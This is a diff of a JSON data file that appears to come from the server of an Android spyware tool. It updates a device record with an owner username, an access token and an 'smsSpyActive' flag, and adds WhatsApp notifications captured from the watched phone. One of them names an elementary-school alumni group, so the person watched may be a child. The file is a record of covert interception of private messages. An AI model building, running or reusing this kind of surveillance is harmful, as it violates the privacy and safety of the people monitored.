@@ -7976,7 +7976,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777190860837,
+    "lastSeen": 1777190890840,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -7992,6 +7992,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4 pesan dari 2 chat",
+        "time": "26/04 16:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777190863859
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (2 pesan): ~ .ཐི༑ཋྀ",
+        "content": "kamsiaa😘",
+        "time": "26/04 16:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777190863783
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "26/04 16:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777190863076
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
